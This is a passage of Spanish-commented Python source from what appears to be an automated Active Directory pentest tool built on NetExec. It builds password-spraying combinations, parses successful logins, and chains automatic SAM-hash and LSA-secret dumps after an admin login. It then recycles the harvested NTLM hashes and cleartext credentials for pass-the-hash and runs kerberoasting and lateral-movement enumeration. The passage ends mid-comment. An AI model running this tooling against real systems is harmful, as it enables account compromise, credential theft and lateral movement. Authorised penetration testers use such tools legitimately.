# por SMB/LDAP, menos falta hace llegar a probarlo. Lo que no aparece aquí (ftp/ssh/vnc,
# mysql/postgres aparte) mantiene su orden de descubrimiento (por puerto), al final.
_CREDS_PROTO_PRIORITY = ("smb", "ldap", "winrm", "rdp", "mssql", "wmi")

# Protocolos de nxc donde "local vs. dominio" tiene sentido (NTLM) y --local-auth existe de
# verdad como opción — confirmado para SMB (doc oficial + --sam/--lsa); WinRM/RDP/WMI/MSSQL/
# LDAP también deberían aceptarlo (mismo mecanismo NTLM), pero SIN confirmar en un run real.
# ssh/ftp/vnc se excluyen a propósito: no tienen noción de dominio (auth plana o de clave), y
# nxc podría ni registrar la opción en esos subcomandos (error de argparse en vez de ignorarla).
_NXC_LOCAL_AUTH_PROTOS = {"smb", "winrm", "rdp", "wmi", "mssql", "ldap"}


_CREDS_SPRAY_WARN = 25   # combos usuario×contraseña a partir de los cuales avisamos fuerte (--user-list/-U + --pass-list/-P)


def _read_cred_list(path, label):
    """Una entrada (usuario o contraseña) por línea para --user-list/-U y --pass-list/-P.
    '#' comenta la línea ENTERA (igual que --creds-file) — no se recorta un '#' a mitad de
    línea, para no romper una contraseña que de verdad lleve ese carácter."""
    try:
        out = []
        for line in Path(path).read_text(encoding="utf-8", errors="replace").splitlines():
            s = line.strip()
            if not s or s.startswith("#"):
                continue
            out.append(s)
        return out
    except OSError as e:
        warn(f"no pude leer {label} {path}: {e}")
        return []


def _dedup_ci(items):
    """Dedup case-insensitive conservando el orden y la 1ª grafía. Para usuarios de Windows/AD,
    que son case-insensitive ('Fiona' y 'fiona' son la MISMA cuenta): probar ambas duplica los
    intentos Y los hallazgos. En Linux NO se aplica (ahí el usuario SÍ distingue mayúsculas)."""
    seen, out = set(), []
    for x in items:
        k = x.lower()
        if k not in seen:
            seen.add(k)
            out.append(x)
    return out


def _user_pass_combos(args, windows=False):
    """users/passwords ya resueltos de --user/--user-list y --pass/--pass-list, y los
    pares (usuario, contraseña) que van a probarse — CRUZADOS (producto cartesiano) salvo
    --no-bruteforce con LAS DOS listas de fichero a la vez, que empareja línea a línea
    (users[i] con passwords[i]) en vez de cruzar todo — p. ej. -U lista.txt -P lista.txt
    --no-bruteforce para probar cada usuario con su propio nombre como contraseña. SIN
    --creds-file (eso son pares explícitos, aparte). Única fuente de verdad para que el
    aviso de confirm_creds_spray y lo que de verdad corre en parse_provided_creds no
    diverjan. `windows`: dedup de usuarios case-insensitive (Windows/AD). Devuelve (combos, users, passwords)."""
    users = _read_cred_list(args.user_list, "--user-list") if args.user_list else \
        ([args.user] if args.user is not None else [])
    if windows:
        users = _dedup_ci(users)
    # El "secreto" suelto es --pass, o --hash (pass-the-hash) si no hay --pass; vacío si ninguno.
    # (main() ya impide combinar --hash con --pass/--pass-list/--creds-file, así que no se mezclan.)
    lone_secret = args.password if args.password is not None else \
        (args.hash if getattr(args, "hash", None) is not None else "")
    passwords = _read_cred_list(args.pass_list, "--pass-list") if args.pass_list else [lone_secret]
    if args.no_bruteforce and args.user_list and args.pass_list:
        if len(users) != len(passwords):
            warn(f"--no-bruteforce: {len(users)} usuario(s) en --user-list pero {len(passwords)} "
                 f"en --pass-list — no coinciden, solo emparejo los primeros "
                 f"{min(len(users), len(passwords))}.")
        return list(zip(users, passwords)), users, passwords
    return [(u, p) for u in users for p in passwords], users, passwords


def _probe_lockout_policy(ip):
    """Antes de confirmar un spray grande (-U + -P): ¿hay política de bloqueo de cuentas
    de verdad, o el riesgo es teórico? `nxc smb --pass-pol` con NXC_ANON_IDS (null → guest
    → Administrator, las mismas identidades y el mismo 1-intento-sin-contraseña de siempre
    — esto NO es un intento de fuerza bruta más). Puro informativo y best-effort: si nxc no
    está, el puerto está cerrado, o ninguna identidad consigue sesión, no hay nada que hacer
    salvo avisar que no se pudo comprobar — nunca bloquea el spray por su cuenta, solo
    informa la decisión. Devuelve (checked, locked_out, detail)."""
    nxc = nxc_bin()
    if not nxc:
        return False, None, "nxc/netexec no está instalado"
    for user, lbl in NXC_ANON_IDS:
        rc, out = run_capture([nxc, "smb", ip, "-u", user, "-p", "", "--pass-pol"], timeout=15)
        if "Account Lockout Threshold" in out:
            m = re.search(r"Account Lockout Threshold:\s*(\S+)", out, re.I)
            val = m.group(1) if m else "?"
            no_lockout = bool(re.search(r"Account Lockout Threshold:\s*(None|0)\b", out, re.I))
            return True, not no_lockout, f"Account Lockout Threshold: {val} (vía {lbl})"
    return False, None, "sin sesión SMB (null/guest/Administrator) para leer la política"


def confirm_creds_spray(args, targets=None):
    """--user-list/-U y --pass-list/-P a la vez CRUZAN las dos listas (todas las
    combinaciones) — eso ya es password spraying de verdad, no el 1-intento-por-cuenta del
    resto de la Fase 5d (--no-bruteforce lo reduce a N pares en vez de N×M, ver
    _user_pass_combos). Se llama UNA sola vez aquí en main() (parse_provided_creds se
    llama por objetivo y no debe volver a preguntar lo mismo); si el combo es grande,
    primero intenta ver si HAY política de bloqueo de verdad (_probe_lockout_policy,
    solo con un único objetivo — con varios no se sabría de cuál avisar) y luego, si hay
    terminal de verdad, pide confirmar. Si se cancela, limpia --user-list/--pass-list —
    --user/--pass/--creds-file sueltos siguen intactos (cancelar el spray no quita la
    reutilización normal de un solo par)."""
    if not (args.user_list or args.pass_list):
        return
    combos, users, passwords = _user_pass_combos(args)
    n = len(combos)
    if n <= _CREDS_SPRAY_WARN:
        return
    if args.no_bruteforce and args.user_list and args.pass_list:
        combo_desc = f"{n} par(es) emparejado(s) 1:1 (--no-bruteforce: usuario[i] con contraseña[i], sin cruzar)"
    else:
        combo_desc = f"{len(users)} usuario(s) × {len(passwords)} contraseña(s) = {n} combinaciones"
    pol_note = ""
    if targets and len(targets) == 1 and nxc_bin():
        ip = targets[0][0]
        info(f"--user-list/--pass-list grande: compruebo antes si hay política de bloqueo de "
             f"cuentas en {ip} (SMB --pass-pol, null/guest/Administrator)…")
        checked, locked, detail = _probe_lockout_policy(ip)
        if checked and locked:
            pol_note = (f" ⚠ POLÍTICA DE BLOQUEO ACTIVA ({detail}) — con {n} intentos por "
                        "servicio el riesgo de bloquear cuentas es REAL, no teórico.")
        elif checked:
            pol_note = (f" Sin bloqueo detectado por SMB ({detail}) — ojo, eso no cubre otros "
                        "servicios (RDP, etc.) que puedan tener su propia política.")
        else:
            pol_note = f" No pude comprobar la política de bloqueo ({detail}) — ve con cuidado igual."
    elif targets and len(targets) > 1:
        pol_note = " (con varios objetivos no compruebo la política de cada uno — hazlo a mano si quieres ir sobre seguro)."
    warn(f"--user-list/--pass-list: {combo_desc} por servicio detectado — esto YA es password "
         f"spraying de verdad (el resto de la Fase 5d es 1 intento por cuenta).{pol_note}")
    if args.jobs > 1 or not sys.stdin.isatty():
        return   # --jobs o entrada no interactiva: ya se avisó, se sigue (el operador ya eligió los flags)
    ans = input(f"{C_CYAN}[?]{C_RESET} ¿Seguir con las {n} combinaciones? [s/N] ").strip().lower()
    if ans != "s":
        warn("cancelado — la Fase 5d sigue con --user/--pass/--creds-file si los diste, sin cruzar listas.")
        args.user_list = None
        args.pass_list = None


def parse_provided_creds(args, windows=False):
    """Lista de (usuario, contraseña) para la Fase 5d, de tres fuentes combinadas:
    - --user/--pass: un par suelto.
    - --user-list/-U y/o --pass-list/-P: ver _user_pass_combos (cruzadas, o emparejadas
      1:1 con --no-bruteforce) — ver confirm_creds_spray para el aviso de listas grandes.
    - --creds-file ('user:pass' por línea, '#' comenta): pares explícitos, SIN cruzar.
    Devuelve la unión deduplicada de las tres fuentes. `windows`: en Windows/AD el usuario es
    case-insensitive, así que 'Fiona:X' y 'fiona:X' se consideran el MISMO par (no se duplican)."""
    creds, _users, _passwords = _user_pass_combos(args, windows=windows)
    if args.creds_file:
        try:
            for line in Path(args.creds_file).read_text(encoding="utf-8", errors="replace").splitlines():
                s = line.strip()
                if not s or s.startswith("#"):
                    continue
                u, _, p = s.partition(":")
                creds.append((u.strip(), p))
        except OSError as e:
            warn(f"no pude leer --creds-file {args.creds_file}: {e}")
    seen, out = set(), []
    for c in creds:
        key = (c[0].lower(), c[1]) if windows else c   # Windows: usuario case-insensitive (Fiona==fiona)
        if key not in seen:
            seen.add(key)
            out.append(c)
    return out


def _parse_nxc_bulk_successes(out):
    """Extrae cada línea de éxito ('[+] ...') de una salida de nxc en modo bulk (-u/-p de
    fichero: puede haber VARIAS líneas de éxito, una por combinación válida) — formato
    típico 'PROTO ip puerto host [+] DOMINIO\\usuario:contraseña (Pwn3d!)'. Generoso con
    el formato a propósito (no todas las versiones/protocolos de nxc lo imprimen exacto
    igual): si una línea tiene '[+]' pero no casa con el patrón de usuario esperado, se
    devuelve igual con user=None para no perder el hallazgo — mejor un hallazgo genérico
    que uno perdido. Devuelve una lista de {"user": str|None, "password": str|None,
    "pwn3d": bool} — "password" es la credencial GANADORA de esta línea (necesaria para
    encadenar un volcado SAM/LSA automático tras un Pwn3d! sin tener que volver a
    probar toda la lista); el llamante la enmascara en el output crudo por separado,
    nunca se pierde aquí.

    SSH en bulk puede meter ruido de verdad en 'out': contra algunos servidores (visto
    con OpenSSH-for-Windows en un run real) el módulo SSH de nxc, basado en paramiko,
    suelta líneas sueltas 'ERROR Internal Paramiko error for user:pass, Error reading SSH
    protocol banner [Errno 104] Connection reset by peer' intercaladas con los '[-]'/'[+]'
    normales — bug confirmado y reconocido por los propios mantenedores de NetExec
    (github.com/Pennyw0rth/NetExec/issues/312: "definitely an issue in paramiko", sin fix
    completo). No es un fallo de palantir ni motivo para reintentar nada: esas líneas no
    llevan '[+]', así que el bucle de abajo ya las ignora solas — simplemente esa
    combinación concreta queda sin confirmar (ni éxito ni fallo limpio) en vez de perderse
    el run entero. Si un objetivo da MUCHO ruido de este tipo por SSH, nxc no es fiable
    ahí — un `hydra -L userlist -P passlist ssh://ip` manual no sufre este bug (no usa
    paramiko) y es la alternativa a mano mientras NetExec no lo arregle."""
    hits = []
    for line in out.splitlines():
        if "[+]" not in line or re.search(r"STATUS_LOGON_FAILURE|STATUS_ACCOUNT", line):
            continue
        if "(Guest)" in line:
            # guest-mapping: el servidor acepta CUALQUIER credencial y la mapea a invitado → NO es
            # un login real (igual que hace _creds_enum). Si no, un box con 'guest' habilitado daba
            # «válido» a todos los usuarios con la 1ª contraseña de la lista (falso positivo).
            continue
        # La contraseña puede llevar ESPACIOS (p. ej. una línea de wordlist sin limpiar, «Windows
        # Creds»): se captura hasta el final de la línea y se le quita el tag final de nxc
        # « (Pwn3d!)»/« (Guest)» si lo hay. Antes «(\S+)» la cortaba en el primer espacio
        # («Windows Creds» → «Windows») → contraseña ganadora equivocada.
        m = re.search(r"\[\+\]\s+(?:[^\s\\]+\\)?([^\s:]+):(.*)$", line)
        pw = None
        if m:
            pw = re.sub(r"\s*\((?:Pwn3d!|Guest)\)\s*$", "", m.group(2)).rstrip() or None
        hits.append({"user": m.group(1) if m else None,
                     "password": pw,
                     "pwn3d": bool(re.search(r"\(Pwn3d!\)", line))})
    return hits


_NT_HASH_EMPTY = "31d6cfe0d16ae931b73c59d7e0c089c0"   # NTLM de la contraseña vacía (MD4(''))


def _parse_nxc_sam(out):
    """Extrae cuentas locales de un volcado SAM de nxc ('--sam'): líneas
    'usuario:RID:hash_LM:hash_NT:::' (formato estándar secretsdump/nxc, confirmado contra
    un volcado real). Devuelve una lista de {"user", "rid", "lm_hash", "nt_hash", "blank"}
    por cuenta — "blank" marca el hash NT constante de la contraseña vacía (MD4(''))."""
    accounts = []
    for m in re.finditer(r"([^\s:]+):(\d+):([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):::", out):
        user, rid, lm, nt = m.groups()
        accounts.append({"user": user, "rid": rid, "lm_hash": lm, "nt_hash": nt,
                          "blank": nt.lower() == _NT_HASH_EMPTY})
    return accounts


def _parse_nxc_lsa(out):
    """Extrae secretos de un volcado LSA de nxc ('--lsa'): claves DPAPI, NL$KM (credenciales
    de dominio cacheadas) y, el hallazgo más valioso, credenciales EN TEXTO CLARO de
    cuentas de servicio/tareas programadas (línea suelta 'usuario:secreto', confirmado
    contra un volcado real: 'frontdesk:Password123'). Generoso a propósito: una línea no
    vacía que no case con ningún patrón conocido ni sea un marcador ('[*] Dumping…'/
    '[+] Dumped…') se guarda igual en "raw" para no perder nada. nxc no siempre repite el
    prefijo 'PROTO ip puerto host' en cada línea (el terminal puede partir una sola línea
    de nxc en dos al mostrarla) — se intenta quitar ese prefijo y, si no casa, se usa la
    línea tal cual. Devuelve {"dpapi": [(clave, valor)], "nlkm": [línea], "creds":
    [(usuario, secreto)], "raw": [línea]}."""
    dpapi, nlkm, creds, raw = [], [], [], []
    prefix_re = re.compile(r"^\s*\S+\s+\S+\s+\d+\s+\S+\s+(.*)$")
    for line in out.splitlines():
        line = line.rstrip()
        if not line.strip():
            continue
        m = prefix_re.match(line)
        payload = m.group(1) if m else line.strip()
        if not payload or payload.startswith("[*]") or payload.startswith("[+]"):
            continue
        dm = re.match(r"^(dpapi_\w+):(0x[0-9a-fA-F]+)$", payload)
        if dm:
            dpapi.append((dm.group(1), dm.group(2)))
            continue
        nm = re.match(r"^(NL\$KM):([0-9a-fA-F]+)$", payload)
        if nm:
            nlkm.append(payload)
            continue
        cm = re.match(r"^([^\s:]+):(.+)$", payload)
        if cm:
            creds.append((cm.group(1), cm.group(2)))
            continue
        raw.append(payload)
    return {"dpapi": dpapi, "nlkm": nlkm, "creds": creds, "raw": raw}


def _dump_sam_lsa(res, nxc, ip, u, p, port=None, dp=None, local_auth=False, is_hash=False, pool=None):
    """Tras un Pwn3d! confirmado por SMB (Fase 5d), encadena automáticamente un volcado de
    SAM (hashes de cuentas locales) y LSA secrets (claves DPAPI, NL$KM, credenciales de
    servicio en texto claro) con la MISMA credencial que ya demostró ser admin — ya no es
    "probar si vale", es la cosecha directa que esa admin ya permite (igual que
    secretsdump.py/crackmapexec a mano). `local_auth` (--local-auth de palantir) replica
    EXACTAMENTE lo que ya usó el chequeo que dio Pwn3d! segundos antes (el llamante pasa
    el mismo valor) — en un Windows SUELTO (sin dominio, como el que motivó esta función)
    nunca hace falta, porque sin dominio nxc ya valida contra la SAM local por defecto;
    solo importa si el objetivo SÍ está unido a un dominio y la cuenta es local de esa
    máquina. Solo SMB: --sam/--lsa son módulos del propio nxc smb — no existen en
    winrm/wmi aunque el Pwn3d! llegara por ahí (el llamante ya filtra por eso)."""
    import tempfile
    pw_file = None
    if p and not is_hash:
        pw_file = tempfile.NamedTemporaryFile("w", delete=False, suffix=".pw")
        pw_file.write(p + "\n")
        pw_file.close()
        os.chmod(pw_file.name, 0o600)
    try:
        # Hash NTLM → -H (pass-the-hash; nxc no admite ahí el truco de fichero que SÍ
        # soporta -p, así que va literal en el argv mientras nxc corre — inevitable).
        # Contraseña → -p FICHERO 0600 (nunca en el argv). En AMBOS casos se enmascara
        # en lo que queda guardado (informe/commands.log): un hash NTLM es tan
        # reutilizable como la contraseña en claro (pass-the-hash no necesita crackeo),
        # así que el informe no debe conservarlo en claro tampoco.
        if is_hash:
            auth, shown_auth = ["-H", p], "-H " + ("''" if not p else "'***'")
        else:
            auth = ["-p", pw_file.name if pw_file else ""]
            shown_auth = "-p " + ("''" if not p else "'***'")
        base_cmd = [nxc, "smb", ip, "-u", u] + auth
        shown_base = f"{nxc} smb {ip} -u {shlex.quote(u)} {shown_auth}"
        if local_auth:
            base_cmd.append("--local-auth")
            shown_base += " --local-auth"
        if port and dp and port != dp:
            base_cmd += ["--port", str(port)]
            shown_base += f" --port {port}"

        rc, out = run_capture(base_cmd + ["--sam"], timeout=90, quiet=True)
        out = out or ""
        accounts = _parse_nxc_sam(out)
        safe_out = out.replace(p, "***") if p else out
        _step(res, shown_base + " --sam", bool(accounts), safe_out,
              note="Pwn3d! por SMB → volcado automático de SAM (hashes de cuentas locales) con la misma credencial de admin")
        for acc in accounts:
            if acc["blank"]:
                res["findings"].append(("critica",
                    f"SAM: «{acc['user']}» (RID {acc['rid']}) tiene la contraseña VACÍA (hash NTLM nulo) — login directo sin contraseña"))
            else:
                res["findings"].append(("alta",
                    f"SAM: hash NTLM de «{acc['user']}» (RID {acc['rid']}): {acc['nt_hash']} — pass-the-hash o crackeo offline"))
        if pool is not None:   # retroalimentación: cada hash NTLM de SAM vale para pass-the-hash en otros servicios
            for acc in accounts:
                if acc["user"] and not acc["user"].endswith("$"):
                    _pool_add(pool, acc["user"], acc["nt_hash"], True)

        rc2, out2 = run_capture(base_cmd + ["--lsa"], timeout=90, quiet=True)
        out2 = out2 or ""
        lsa = _parse_nxc_lsa(out2)
        lsa_hit = bool(lsa["dpapi"] or lsa["nlkm"] or lsa["creds"] or lsa["raw"])
        safe_out2 = out2.replace(p, "***") if p else out2
        _step(res, shown_base + " --lsa", lsa_hit, safe_out2,
              note="Pwn3d! por SMB → volcado automático de LSA secrets (DPAPI/NL$KM/credenciales de servicio) con la misma credencial de admin")
        for user, secret in lsa["creds"]:
            res["findings"].append(("critica",
                f"LSA: credencial en texto claro encontrada — «{user}:{secret}»   # probarla en otros servicios (--creds-file)"))
        if pool is not None:   # retroalimentación: cred de servicio en claro → reprobar en todos los servicios
            for user, secret in lsa["creds"]:
                _pool_add(pool, user, secret, False)
        if lsa["dpapi"]:
            res["findings"].append(("alta", f"LSA: {len(lsa['dpapi'])} clave(s) DPAPI volcada(s) (máquina/usuario) — ver salida cruda del paso"))
        if lsa["nlkm"]:
            res["findings"].append(("alta", "LSA: NL$KM volcada (clave de credenciales de dominio cacheadas)"))
    finally:
        if pw_file:
            try:
                os.unlink(pw_file.name)
            except OSError:
                pass


def _count_roast(out):
    """Nº de hashes crackeables ($krb5asrep$/$krb5tgs$) en una salida de nxc --asreproast/
    --kerberoasting. Sirve también de 'hubo botín' para marcar el paso OK."""
    return len(re.findall(r"\$krb5(?:asrep|tgs)\$", out or ""))


def _add_once(res, sev, text, marker, seen=None):
    """Añade un hallazgo salvo que ya exista otro cuyo texto contenga `marker` — evita
    duplicar el MISMO hallazgo cuando SMB y LDAP enumeran lo mismo en un DC. Por defecto
    mira dentro de res["findings"] (vale cuando SMB y LDAP comparten el mismo res, como en
    una llamada aislada). Si se pasa `seen` (un set compartido entre VARIOS res — necesario
    desde que cada protocolo de la Fase 5d tiene su propio footprint-dict, ver
    provided_creds_check) mira y actualiza ESE en su lugar, para deduplicar también ENTRE
    dicts distintos. Devuelve True si lo añadió."""
    if seen is not None:
        if marker in seen:
            return False
        seen.add(marker)
    elif any(marker in t for _, t in res["findings"]):
        return False
    res["findings"].append((sev, text))
    return True


def _parse_nxc_userlist(out):
    """Nombres de usuario de una salida de `nxc --users` (SMB o LDAP): el 1er token de cada
    fila de la tabla (tras el prefijo 'PROTO ip puerto host'), saltando banner/estado/
    cabecera. Fuera cuentas de equipo ($). Puro → testeable en --selftest."""
    users, pre = [], re.compile(r"^\s*\S+\s+\S+\s+\d+\s+\S+\s+(.*)$")
    for line in out.splitlines():
        m = pre.match(line)
        if not m:
            continue
        payload = m.group(1).strip()
        if not payload or payload[0] in "[-" or payload.startswith("Enumerated"):
            continue
        tok = payload.split()[0]
        if re.fullmatch(r"[A-Za-z0-9._-]+", tok):   # sAMAccountName normal, sin '$' (equipos)
            users.append(tok)
    return list(dict.fromkeys(users))


def _parse_nxc_group_members(out):
    """Miembros de un grupo en la salida de `nxc ldap --groups "Grupo"`: nxc imprime SOLO los
    miembros (uno por línea, tras el prefijo 'PROTO ip puerto host'), NO el nombre del grupo.
    Formato confirmado en el código fuente de nxc (nxc/protocols/ldap.py: imprime el
    sAMAccountName, o el cn si el miembro es un grupo anidado). Descarta banner/estado
    [*]/[+]/[-] y los avisos 'Group ... not found / has no members'. Puro → testeable sin red."""
    pre = re.compile(r"^\s*\S+\s+\S+\s+\d+\s+\S+\s+(.*)$")
    members = []
    for line in (out or "").splitlines():
        m = pre.match(line)
        if not m:
            continue
        payload = m.group(1).strip()
        if not payload or payload[0] in "[-":
            continue
        members.append(payload)
    return list(dict.fromkeys(members))


_LOGGEDON_RE = re.compile(r"(\S+)\\(\S+)\s+logon_server:", re.I)


def _parse_loggedon_users(out):
    """'DOMINIO\\usuario' de cada usuario con sesión abierta en la salida de
    `nxc smb --loggedon-users`. Formato confirmado en el código fuente de nxc
    (nxc/protocols/smb.py): cada usuario sale como 'DOMINIO\\usuario<relleno> logon_server:
    SERVIDOR'. Puro → testeable sin red."""
    seen = []
    for m in _LOGGEDON_RE.finditer(out or ""):
        who = f"{m.group(1)}\\{m.group(2)}"
        if who not in seen:
            seen.append(who)
    return seen


def _surface_ad_enum(res, u, mod, out, base=None, seen=None):
    """Saca como HALLAZGO lo accionable de la enum AD con credencial (lista de usuarios del
    dominio, ausencia de bloqueo de cuentas) — no solo enterrado en el output crudo, igual
    que ya hace el enum anónimo. Deduplicado por marcador (en un DC, SMB y LDAP enumeran lo
    mismo) — ver `_add_once` para qué hace `seen`. Si hay usuarios, los guarda en
    <base>/ad_users.txt, listos para spraying/AS-REP roast (GetNPUsers -usersfile)."""
    users = []
    if mod == "--users":
        users = _parse_nxc_userlist(out)
    elif mod == "--rid-brute":
        users = list(dict.fromkeys(
            x for x in re.findall(r"\d+:\s+[^\s\\]+\\(.+?)\s+\(SidTypeUser\)", out)
            if not x.endswith("$")))
    if users:
        tip = f" (→ {base / 'ad_users.txt'})" if base else ""
        if _add_once(res, "alta",
                     f"AD (cred {u}): {len(users)} usuarios del dominio{tip}: "
                     + ", ".join(users[:20]) + (" …" if len(users) > 20 else ""),
                     "usuarios del dominio", seen) and base:
            try:
                _merge_write_ad_users(base, users)
            except OSError:
                pass
    if mod == "--pass-pol":
        pol = _parse_pass_pol(out)
        pp = _format_pass_pol_finding(pol, prefix=f"AD (cred {u})")
        if pp:
            _add_once(res, "info", pp, "política de contraseñas", seen)
        if pol.get("lockout_threshold") in ("None", "0"):
            _add_once(res, "media",
                      f"AD (cred {u}): sin bloqueo de cuentas (lockout None/0) → el password spraying no bloquea cuentas",
                      "sin bloqueo de cuentas", seen)


_LAPS_HIT_RE = re.compile(r"Computer:(\S+)\s+User:\S+\s+Password:(\S+)")


def _parse_laps_hits(out):
    """(equipo, contraseña) por cada LAPS legible en la salida de `nxc ldap -M laps`. El
    formato está confirmado en el código fuente de nxc (nxc/modules/laps.py):
    'Computer:<nombre> User:<usuario con relleno a 15> Password:<contraseña>' por equipo —
    el relleno del campo User (espacios de sobra antes de 'Password:') es justo por lo que
    el regex usa '\\s+' de por medio en vez de un único espacio literal. Puro → testable
    sin red."""
    return _LAPS_HIT_RE.findall(out or "")


_LM_HASH_EMPTY = "aad3b435b51404eeaad3b435b51404ee"   # LM de la contraseña vacía (sin LM real)


def _secretsdump_hash(out, user):
    """Hash NT de UNA cuenta concreta en la salida de secretsdump.py: formato estándar
    'usuario:RID:lm:nt:::' (el mismo que _parse_nxc_sam). None si la cuenta no aparece —
    sin derechos DCSync, secretsdump no llega a imprimir la línea (se queda en el error de
    RPC_S_ACCESS_DENIED de la fase DRSUAPI). Puro → testable sin red."""
    m = re.search(rf"(?im)^{re.escape(user)}:\d+:[0-9a-fA-F]{{32}}:([0-9a-fA-F]{{32}}):::", out or "")
    return m.group(1) if m else None


def _parse_adidnsdump_csv(text):
    """Filas 'tipo,nombre,valor' del records.csv de adidnsdump (formato confirmado en su
    código fuente, dnsdump.py: cabecera 'type,name,value', sin comillas/escapado) — descarta
    la cabecera y los registros sin resolver ('?,?'). Devuelve [(tipo, nombre, valor)].
    Puro → testable sin red."""
    rows = []
    for line in (text or "").splitlines():
        line = line.strip()
        if not line or line == "type,name,value":
            continue
        parts = line.split(",", 2)
        if len(parts) != 3 or parts[0] == "?" or parts[1] == "?":
            continue
        rows.append(tuple(parts))
    return rows


def _creds_enum(res, nxc, np, ip, u, secret, is_hash, local_auth, is_dc, port, dp, base, seen=None, domain=None):
    """Fase 5d — enumeración de SOLO LECTURA por SMB/LDAP USANDO la credencial aportada que
    ACABA de validar (no null/guest): es justo lo que el operador espera al dar -u/-p/-H, y
    lo que faltaba (antes la credencial solo se probaba como login y la enum iba como sesión
    nula). SMB: --shares (+ spidering de contenido si --spider) y, si es DC, --users/--groups/
    --pass-pol/--rid-brute. LDAP: --users/--groups/--pass-pol/--admin-count/delegación, el
    premio gordo --asreproast/--kerberoasting (hashes crackeables offline) y, si hay AD CS
    (certipy instalado + dominio ya conocido), 'certipy find -vulnerable' (plantillas de
    certificados vulnerables ESC1-8, ver más abajo). La contraseña va
    por fichero 0600 (-p FICHERO); el hash, literal por -H (nxc no admite ahí el truco de
    fichero). AMBOS se enmascaran en lo que queda guardado (informe/commands.log) — un hash
    NTLM es tan reutilizable como la contraseña en claro (pass-the-hash no necesita crackeo).
    Se llama UNA vez por protocolo (la 1ª credencial válida basta para enumerar el dominio).
    `domain`: dominio AD ya resuelto (discover_domains, calculado pronto — ver run_one) o
    None si todavía no se conoce; sin él, certipy no puede formar '-u user@dominio' y el
    paso se deja como sugerencia manual con el placeholder "DOMINIO" (igual que Kerberos,
    ver _fill_domain_placeholder).
    `seen`: set compartido con la llamada hermana del otro protocolo (ver provided_creds_check)
    para que _surface_ad_enum deduplique ENTRE SMB y LDAP aunque ahora cada uno tenga su propio
    `res` (antes de separarlos por protocolo, un único `res` compartido bastaba)."""
    import tempfile
    _scope = "dominio" if is_dc else "locales"
    _steps_preview = {
        "smb": f"--shares + --users/--pass-pol/--rid-brute (cuentas {_scope})",
        "ldap": "--users/--groups/--pass-pol/--admin-count/delegación + --asreproast/--kerberoasting",
    }.get(np, np)
    info(f"Credencial de «{u}» válida por {np.upper()}: enumero el dominio con ella ({_steps_preview})")
    why("cada paso puede tardar 1-2 min contra un DC real y NO se imprime nada hasta que termina "
        "(se enseña todo junto al final, con el resto del footprint) — si la pantalla se queda "
        "muda aquí varios minutos es esto, no que palantir se haya quedado pillado.")
    sec_file = None
    if secret and not is_hash:
        sec_file = tempfile.NamedTemporaryFile("w", delete=False, suffix=".pw")
        sec_file.write(secret + "\n")
        sec_file.close()
        os.chmod(sec_file.name, 0o600)
    use_la = local_auth and np in _NXC_LOCAL_AUTH_PROTOS

    def A():   # argv de auth (se reconstruye por llamada: el fichero de contraseña es el mismo)
        a = ["-u", u] + (["-H", secret] if is_hash else ["-p", sec_file.name if sec_file else ""])
        if use_la:
            a.append("--local-auth")
        if port and dp and port != dp:
            a += ["--port", str(port)]
        return a

    la = " --local-auth" if use_la else ""
    pt = f" --port {port}" if (port and dp and port != dp) else ""
    shown_sec = ("-H " if is_hash else "-p ") + ("''" if not secret else "'***'")
    shown_auth = f"-u {shlex.quote(u)} {shown_sec}{la}{pt}"

    def mask(o):
        return o.replace(secret, "***") if secret else o

    try:
        if np == "smb":
            rc, out = _run_capture_retry([nxc, "smb", ip] + A() + ["--shares"], timeout=120, quiet=True)
            _step(res, f"{nxc} smb {ip} {shown_auth} --shares", _nxc_ok(out), mask(out),
                  note=f"comparticiones y permisos CON la credencial de «{u}» (no como null/guest)")
            readable = _smb_readable_shares(out)
            if readable:
                res["findings"].append(("alta", f"SMB (cred {u}): share(s) legible(s) — {', '.join(readable[:8])}"))
            if re.search(r"\bWRITE\b", out):
                res["findings"].append(("alta", f"SMB (cred {u}): al menos un share ESCRIBIBLE (WRITE)"))
            # --users/--pass-pol/--rid-brute son SAMR/LSA sobre el SAM → funcionan TAMBIÉN contra un
            # SMB/Samba SUELTO (no-DC): ahí enumeran las cuentas LOCALES (el "dominio" SAMR de una
            # máquina de workgroup es su propio SAM). Por eso ya NO se capan con is_dc — en un DC dan
            # las del dominio, en un host suelto las locales; ambas valen (RID cycling sobre todo, que
            # saca usuarios aunque --users esté capado). (--groups NO: nxc 1.5.1 lo movió al protocolo
            # ldap, '[-] [REMOVED]'; va por LDAP más abajo.)
            for mod, note in (("--users", f"usuarios ({_scope}) — con credencial, lista completa; base para spraying/roasting"),
                              ("--pass-pol", "política de contraseñas (longitud, bloqueo)"),
                              ("--rid-brute", "RID cycling por IPC$ (saca usuarios aunque --users esté capado) — en un "
                                              "dominio con muchas cuentas puede tardar bastante más que en un lab pequeño")):
                # --rid-brute en concreto escala con el tamaño del dominio (más cuentas = más RIDs
                # que probar) — contra un AD con varios cientos de cuentas, 120s se queda corto
                # de forma CONSISTENTE (no es un timeout transitorio, _run_capture_retry no ayuda
                # si el fallo se repite siempre con el mismo límite corto).
                rc, out = _run_capture_retry([nxc, "smb", ip] + A() + [mod], timeout=240, quiet=True)
                _step(res, f"{nxc} smb {ip} {shown_auth} {mod}", rc == 0, mask(out), note=note)
                _surface_ad_enum(res, u, mod, out, base, seen)
            # --loggedon-users: ¿quién tiene sesión abierta AHORA en el objetivo? Necesita admin
            # LOCAL en la máquina (consulta wkssvc) — si la credencial es de bajo privilegio
            # devuelve 'Error enumerating logged on users' y el paso solo lo registra. Cuando SÍ
            # entra, es oro para el movimiento lateral: delata en qué equipo está logueado un
            # usuario privilegiado (ahí se le roba el token / se cosechan sus credenciales).
            rc, out = _run_capture_retry([nxc, "smb", ip] + A() + ["--loggedon-users"], timeout=120, quiet=True)
            logged = _parse_loggedon_users(out)
            _step(res, f"{nxc} smb {ip} {shown_auth} --loggedon-users", bool(logged), mask(out),
                  note="usuarios con sesión abierta ahora mismo en el objetivo (necesita admin local): "
                       "dónde está logueado un usuario privilegiado = objetivo de movimiento lateral")
            if logged:
                res["findings"].append(("info",
                    f"SMB (cred {u}): {len(logged)} usuario(s) con sesión activa en el objetivo — "
                    + ", ".join(logged[:10]) + (" …" if len(logged) > 10 else "")))
            if SPIDER and readable:
                _nxc_spider(res, nxc, ip, A(), shown_auth, readable, SPIDER_PATTERN)
            # GPP (Group Policy Preferences) cpassword en SYSVOL — SOLO en un DC (SYSVOL no
